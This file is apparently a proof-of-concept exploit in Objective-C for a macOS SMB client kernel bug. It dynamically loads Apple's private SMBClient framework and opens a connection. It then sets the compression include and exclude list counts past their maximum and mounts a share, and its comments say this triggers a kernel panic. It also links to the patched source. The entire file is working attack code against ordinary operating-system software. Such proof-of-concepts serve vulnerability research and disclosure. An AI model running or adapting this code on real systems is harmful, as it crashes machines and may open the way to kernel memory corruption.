#import <stdio.h>
#import <stdint.h>
#import <stdlib.h>
#import <unistd.h>
#import <sys/mman.h>
#import <errno.h>
#import <mach-o/dyld.h>
#import <mach/mach.h>
#import <pthread.h>

#import <sys/mount.h>
#import <sys/socket.h>
#import <netinet/in.h>
#import <arpa/inet.h>
#import <sys/stat.h>
#import <sys/wait.h>
#import <unistd.h>
#import <fcntl.h>
#import <errno.h>
#import <sys/ioctl.h>
#import <dlfcn.h>
#import <Foundation/Foundation.h>
#import <IOKit/kext/KextManager.h>   

#import "smbfs.h"
#import "msfscc.h"


#define TARGET_SMBX_HOST   "127.0.0.1"
#define TARGET_SMBX_PORT   445
#define MOUNTDIR           "/tmp/mounted"

void *SMBClientHandle = NULL;


NTSTATUS SMBOpenServerEx(const char * targetServer, SMBHANDLE * outConnection, uint64_t options) {
    void *funcAddr = dlsym(SMBClientHandle, "SMBOpenServerEx");
    typedef NTSTATUS (*smb_func_t)(const char *, SMBHANDLE *, uint64_t);
    smb_func_t func = (smb_func_t) funcAddr;
    return func(targetServer, outConnection, options);
}

NTSTATUS SMBReleaseServer(SMBHANDLE inConnection) {
    void *funcAddr = dlsym(SMBClientHandle, "SMBReleaseServer");
    typedef NTSTATUS (*smb_func_t)(SMBHANDLE);
    smb_func_t func = (smb_func_t) funcAddr;
    return func(inConnection);
}

NTSTATUS SMBMountShareExDict(
    SMBHANDLE inConnection,
    const char *targetShare,
    const char *mountPoint,
    CFDictionaryRef mountOptions,
    CFDictionaryRef *retMountInfo,
    void (*callout)(void *, void *),
    void *args)
{
    void *funcAddr = dlsym(SMBClientHandle, "SMBMountShareExDict");
    typedef NTSTATUS (*mount_func_t)(SMBHANDLE, const char *, const char *,
                                     CFDictionaryRef, CFDictionaryRef *,
                                     void (*)(void *, void *), void *);
    mount_func_t func = (mount_func_t) funcAddr;
    return func(inConnection, targetShare, mountPoint, mountOptions, retMountInfo, callout, args);
}

CFMutableDictionaryRef CreateMountOptions(void) {
    CFMutableDictionaryRef dict = CFDictionaryCreateMutable(
        kCFAllocatorDefault,
        0,
        &kCFTypeDictionaryKeyCallBacks,
        &kCFTypeDictionaryValueCallBacks);

    int zero = 0;
    CFNumberRef num = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &zero);
    CFDictionarySetValue(dict, CFSTR("MountFlags"), num);
    CFRelease(num);

    return dict;
}





void fill_exclude_list(struct smb_ctx *ctx, uint32_t count, uint32_t len, char c) {
    if (!ctx || count > kClientCompressMaxEntries || len >= kClientCompressMaxExtLen) return;

    static char buffer[kClientCompressMaxEntries][kClientCompressMaxExtLen];

    for (uint32_t i = 0; i < count; i++) {
        memset(buffer[i], c, len);
        buffer[i][len] = '\0';
        ctx->prefs.compression_exclude[i] = buffer[i];
    }
    ctx->prefs.compression_exclude_cnt = count;
}

void fill_include_list(struct smb_ctx *ctx, uint32_t count, uint32_t len, char c) {
    if (!ctx || count > kClientCompressMaxEntries || len >= kClientCompressMaxExtLen) return;

    static char buffer[kClientCompressMaxEntries][kClientCompressMaxExtLen];

    for (uint32_t i = 0; i < count; i++) {
        memset(buffer[i], c, len);
        buffer[i][len] = '\0';
        ctx->prefs.compression_include[i] = buffer[i];
    }
    ctx->prefs.compression_include_cnt = count;
}

void fill_exclude_list_alloc(struct smb_ctx *ctx, uint32_t count, uint32_t len, char c) {

    for (uint32_t i = 0; i < count; i++) {
        // free 제거 (기존 값이 리터럴일 수 있음)
        char *str = (char *)malloc(len + 1);
        if (!str) continue;
        memset(str, c, len);
        str[len] = '\0';

        ctx->prefs.compression_exclude[i] = str;
    }
    ctx->prefs.compression_exclude_cnt = count;
}

void fill_include_list_alloc(struct smb_ctx *ctx, uint32_t count, uint32_t len, char c) {

    for (uint32_t i = 0; i < count; i++) {
        // free 제거 (기존 값이 리터럴일 수 있음)
        char *str = (char *)malloc(len + 1);
        if (!str) continue;
        memset(str, c, len);
        str[len] = '\0';

        ctx->prefs.compression_include[i] = str;
    }
    ctx->prefs.compression_include_cnt = count;
}

int main(int argc, char *argv[], char *envp[]) {    

    // 1. create dir for mount
    if(access(MOUNTDIR, F_OK) != 0) mkdir(MOUNTDIR, 0755);

    // 2. Open SMBClient handle
    SMBClientHandle = dlopen("/System/Library/PrivateFrameworks/SMBClient.framework/SMBClient", RTLD_NOW);
    printf("SMBClientHandle = %p\n", SMBClientHandle);

    // 3. Call SMBOpenServerEx
    SMBHANDLE serverConnection = NULL;
    // Edit here: USER_ID, SMB_SERVER_IP, share....
    NTSTATUS status = SMBOpenServerEx("//[USER_ID]@[SMB_SERVER_IP]:445/share", &serverConnection, kSMBOptionSessionOnly);
    printf("SMBOpenServerEx status = 0x%x\n", status);

    // 4. Obtain serverConnection info
    struct smb_server_handle *handle = (struct smb_server_handle *)serverConnection;
    struct smb_ctx *ctx = handle->context;
    struct smb_prefs *prefs = &ctx->prefs; 

    uint32_t excl_cnt = prefs->compression_exclude_cnt;
    uint32_t incl_cnt = prefs->compression_include_cnt;


    // BUG is here; there's no check about compression_include_cnt, compression_exclude_cnt;
    // patched vulns code is at https://github.com/apple-oss-distributions/SMBClient/blob/SMBClient-494.120.2/kernel/smbfs/smbfs_vfsops.c#L1110
    // Related strings are:
    // SMBERROR("compression_exclude_cnt <%d> greater than max allowed <%d>", args->compression_exclude_cnt, kClientCompressMaxEntries);
    // SMBERROR("compression_include_cnt <%d> greater than max allowed <%d>", rgs->compression_include_cnt, kClientCompressMaxEntries - 1);
    //if greater than kClientCompressMaxEntries(=64), than triggers panic
    fill_include_list_alloc(ctx, 0x100, 16, 'A'); 
    fill_exclude_list_alloc(ctx, 0x40, 16, 'A');

    // char		compression_exclude[kClientCompressMaxEntries][kClientCompressMaxExtLen];
	// uint32_t	compression_exclude_cnt;
	// char		compression_include[kClientCompressMaxEntries][kClientCompressMaxExtLen];
	// uint32_t	compression_include_cnt;

    // prefs->compression_include_cnt = 0x100;
    // prefs->compression_exclude_cnt = 0x41;

    // size_t offset_exclude = offsetof(struct smb_mount_args, compression_exclude);
    // size_t offset_exclude_cnt = offsetof(struct smb_mount_args, compression_exclude_cnt);
    // size_t offset_include = offsetof(struct smb_mount_args, compression_include);
    // size_t offset_include_cnt = offsetof(struct smb_mount_args, compression_include_cnt);

    // printf("compression_exclude offset = %zu\n", offset_exclude);
    // printf("compression_exclude_cnt offset = %zu\n", offset_exclude_cnt);
    // printf("compression_include offset = %zu\n", offset_include);
    // printf("compression_include_cnt offset = %zu\n", offset_include_cnt);
    


    struct smb_server_handle *handle2 = (struct smb_server_handle *)serverConnection;
    struct smb_ctx *ctx2 = handle2->context;
    struct smb_prefs *prefs2 = &ctx2->prefs; 

    uint32_t imcl_cnt2 = prefs->compression_include_cnt;
    printf("incl_cnt2 = 0x%x\n", imcl_cnt2);
\
    // 5. mount smbfs
    CFMutableDictionaryRef mOptions = CreateMountOptions();
    if (NT_SUCCESS(status)) {
        status = SMBMountShareExDict((SMBHANDLE)serverConnection, NULL, MOUNTDIR,
                                     mOptions, NULL,
                                     NULL, NULL);
        printf("SMBMountShareExDict status = 0x%x\n", status);
	}

 
    // Clean up
    if (serverConnection) {
		status = SMBReleaseServer(serverConnection);
        printf("SMBReleaseServer status = 0x%x\n", status);
    }

    dlclose(SMBClientHandle);

    puts("done");


    return 0;
}